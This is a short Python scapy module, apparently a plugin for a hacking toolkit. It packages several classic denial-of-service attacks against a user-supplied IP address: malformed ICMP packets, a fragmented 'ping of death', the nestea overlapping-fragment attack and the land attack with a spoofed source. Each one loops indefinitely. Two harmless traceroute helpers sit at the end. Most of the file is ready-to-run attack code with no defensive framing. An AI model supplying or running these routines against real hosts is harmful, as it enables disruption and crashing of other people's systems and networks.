from scapy.all import *
import time

desc = 'provides a number of simple scapy attacks and utils, borrowed from the scapy website'
author = 'nwx'
cmds = []

def malformed():
	dst = raw_input('ip address> ')
	while 1:
		send(IP(dst=dst, ihl=2, version=3)/ICMP())
		time.sleep(1)
		print 'sent...'
cmds.append(('malpacket','sends malformed ICMP packets to an IP',malformed))

def deathping():
	dst = raw_input('ip address> ')
	while 1:
		send(fragment(IP(dst=dst)/ICMP()/("X"*60000)))
		time.sleep(1)
		print 'sent...'
cmds.append(('deathping2','sends very large ICMP packets to an IP (different implementation)',deathping))

def nestea():
	target = raw_input('ip address> ')
	while 1:
		send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
		send(IP(dst=target, id=42, frag=48)/("X"*116))
		send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))
		time.sleep(1)
		print 'sent...'
cmds.append(('nestea','DoS for older linux and windows',nestea))

def land():
	target = raw_input('ip address> ')
	while 1:
		send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
		time.sleep(1)
		print 'sent...'
cmds.append(('land','DoS for older windows',land))

def traceroute():
	dst = raw_input('ip address> ')
	ans,unans=sr(IP(dst=dst,ttl=(1,10))/TCP(dport=53,flags="S"))
	ans.summary(lambda s,r: r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))
cmds.append(('traceroute','uses a TCP SYN traceroute to find a route',traceroute))

def dnstraceroute():
	dst = raw_input('ip address> ')
	ans,unans=traceroute(dst,l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname="google.com")))
cmds.append(('dnstraceroute','uses a UDP DNS traceroute to find a route',dnstraceroute))
